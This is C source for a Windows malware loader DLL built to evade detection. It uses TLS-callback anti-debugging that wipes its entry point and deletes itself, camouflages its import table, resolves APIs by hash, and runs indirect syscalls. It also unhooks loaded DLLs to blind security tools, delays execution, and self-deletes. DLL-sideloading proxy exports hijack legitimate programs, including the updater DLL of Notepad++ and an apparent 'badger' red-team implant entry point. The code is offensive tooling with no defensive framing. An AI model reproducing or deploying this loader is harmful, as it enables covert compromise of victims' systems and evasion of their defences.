#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include "Structs.h"
#include "Common.h"
#include "FunctionPntrs.h"
#include "IatCamo.h"
#include "Debug.h"
//#include <WinInet.h>
#pragma comment (lib, "shell32.lib")


#define badger



#pragma comment(linker,"/INCLUDE:_tls_used")
#pragma comment(linker,"/INCLUDE:IfDebug")

VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext);
#pragma const_seg(".CRT$XLB")
EXTERN_C CONST PIMAGE_TLS_CALLBACK IfDebug = (PIMAGE_TLS_CALLBACK)ADTlsCallback;
#pragma const_seg()


//----------------------------------------------------------------

PBYTE		g_pRsrcPayloadBuffer = NULL;
SIZE_T		g_dwRsrcPayloadSize = NULL;
FLOAT		_fltused = 0.0;	
FLOAT		g_Nt_DELAY_TIME = 0.1; //2  
NT_API		g_NtXX = { 0 };


VOID AddWin32uToIat() {

	WCHAR szPath[MAX_PATH] = { 0 };
	SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}



VOID DelayExecution(IN FLOAT fMinutes) {

	NTSTATUS			STATUS = 0x00;
	DWORD				dwMilliSeconds = fMinutes * 60000;					// Converting minutes to milliseconds  
	LONGLONG            Delay = dwMilliSeconds * 10000;			// Converting from milliseconds to the 100-nanosecond negative time interval
	LARGE_INTEGER       DelayInterval = { .QuadPart = (-1 * Delay) };

	SET_SYSCALL(g_NtXX.NtDelayExecution);
	if (!NT_SUCCESS(STATUS = RunSyscall(FALSE, &DelayInterval)) && STATUS != STATUS_TIMEOUT) {
#ifdef DEBUG
		PRINT("[!] NtDelayExecution Failed With Error: 0x%0.8X - %s.%d \n", STATUS, GET_FILENAME(__FILE__), __LINE__);
#endif
	}

}




int run() {



	PVOID	pVehHandler = NULL,
			pInjectedPayload = NULL;

	check_debuuger();
	// Add fake imports to the IAT
	IatCamouflage();
//
	// Force win32u.dll to be loaded
	AddWin32uToIat();

	fnAddVectoredExceptionHandler		pAddVectoredExceptionHandler = (fnAddVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), AddVectoredExceptionHandler_CRC32);
	fnRemoveVectoredExceptionHandler	pRemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), RemoveVectoredExceptionHandler_CRC32);
//
	if (!pAddVectoredExceptionHandler || !pRemoveVectoredExceptionHandler) {
#ifdef DEBUG
		PRINT("[!] Failed To Fetch One Or More Function Pointers - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
		goto _DEBUG_END;
#endif 
		return -1;
	}

	if (!InitIndirectSyscalls(&g_NtXX)) {
#ifdef DEBUG
		goto _DEBUG_END;
#endif 
		return -1;
	}


#ifdef DELAY
#ifdef DEBUG
	PRINT("[i] Delaying Execution For %d Seconds ... ", (DWORD)(g_Nt_DELAY_TIME * 60));
#endif
	DelayExecution(g_Nt_DELAY_TIME);
#ifdef DEBUG
	PRINT("[+] DONE \n");
#endif
#endif // DELAY

//
////	 Start the VEH 
	pVehHandler = pAddVectoredExceptionHandler(1, VectoredExceptionHandler);
	if (pVehHandler == NULL) {
#ifdef DEBUG
		PRINT("[!] AddVectoredExceptionHandler Failed With Error: %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
		goto _DEBUG_END;
#endif 
		return -1;
	}
//
	UnhookAllLoadedDlls();
//
	if (!pRemoveVectoredExceptionHandler(pVehHandler)) {
#ifdef DEBUG
		PRINT("[!] RemoveVectoredExceptionHandler Failed With Error: %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
		goto _DEBUG_END;
#endif 
		return -1;
	}
//

		HWBP();
		SelfDelete();

	    return 0;



#ifdef DEBUG
		_DEBUG_END :
		switch (MessageBoxA(NULL, "Free Debug Console ?", "Loader.exe", MB_OKCANCEL | MB_ICONQUESTION)) {
		case IDOK: {
			FreeConsole();
			break;
		}
		default: {
			break;
		}
		}
		return -1;
#endif 

}

//-------------------------------------------------------------------------------------------------------------
VOID ADTlsCallback(PVOID hModule, DWORD dwReason, PVOID pContext) {

	DWORD dwOldProtection = 0x00;

	/*if (dwReason == DLL_PROCESS_ATTACH) {
		PRINT("TLS [i] Main function Address: 0x%p \n", main);*/

		if (*(BYTE*)run == IN3_INSTRUCTION_OPCODE || NtDebuggerCheck() || HWBPCheck() || OutoutDebugStringCheck()) {
			//PRINT("[TLS][!] Entry Point Is Patched with \"INT 3\" Instruction!\n");

			VirtualProtect(&run, OVERWRITE_SIZE, PAGE_EXECUTE_READWRITE, &dwOldProtection);
			memset(run, 0xFF, OVERWRITE_SIZE);
				//PRINT("[TLS][+] Main function is Overwriten with 0xff bytes\n");
			SelfDelete();
		}
		
}

#ifdef MONITOR
	typedef HRESULT(WINAPI* fnDWriteCreateFactory)(IN enum DWRITE_FACTORY_TYPE factoryType, IN REFIID iid, OUT IUnknown** factory);

	extern __declspec(dllexport) HRESULT DWriteCreateFactory(IN enum DWRITE_FACTORY_TYPE factoryType, IN REFIID iid, OUT IUnknown * *factory) {

		HANDLE                  hModule = NULL;
		fnDWriteCreateFactory   pOringinalDWriteCreateFactory = NULL;

		// Running the payload in a separate thread
		CreateThread(NULL, 0x00, run, NULL, 0x00, NULL);

		// Resolving the original "DWriteCreateFactory" function address
		if (!(hModule = LoadLibrary(L"Aga.Monitor.dll")))
			return E_ABORT;

		if (!(pOringinalDWriteCreateFactory = (fnDWriteCreateFactory)GetProcAddress(hModule, "DWriteCreateFactory")))
			return E_ABORT;

		// Calling the original "DWriteCreateFactory" function, and returning its output
		return pOringinalDWriteCreateFactory(factoryType, iid, factory);
		
		SelfDelete();
	}

	



#endif

#ifdef badger


extern __declspec(dllexport) PVOID DtcMainExt() {
	run();

	return NULL;
}

#endif

	//---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef NOTEPAD


#pragma comment(linker,"/export:curl_easy_setopt=gup.curl_easy_setopt,@10")
#pragma comment(linker,"/export:curl_easy_cleanup=gup.curl_easy_cleanup,@1")
#pragma comment(linker,"/export:curl_easy_perform=gup.curl_easy_perform,@12")

	typedef PVOID(WINAPI* fncurl_easy_init)();


	extern __declspec(dllexport) PVOID curl_easy_init() {

		HANDLE                  hModule = NULL,
			hThread = NULL;
		fncurl_easy_init        pcurl_easy_init = NULL;

		// Running the payload
		if (!(hThread = CreateThread(NULL, 0x00, run, NULL, 0x00, NULL)))
			return NULL;

		// Running the original 'curl_easy_init' function 
		if (!(hModule = LoadLibrary(L"gup.dll"))) {
#ifdef DEBUG
			PRINT("[!] LoadLibrary Failed To Load GUP.DLL: %d - %s.%d \n", GetLastError(), GET_FILENAME(__FILE__), __LINE__);
#endif 
			return NULL;
		}

		if (!(pcurl_easy_init = (fncurl_easy_init)GetProcAddressH(hModule, curl_easy_init_CRC32))) {
#ifdef DEBUG
			PRINT("[!] GetProcAddressH Failed To Fetch Original curl_easy_init's Address - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif 
			return NULL;
		}

		return pcurl_easy_init();
	}

#endif



BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {

		switch (dwReason) {

		case DLL_PROCESS_ATTACH: {

#ifdef DEBUG
			CreateDebugConsole();
#endif // DEBUG


			break;
		}

		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		}

		return TRUE;
	}


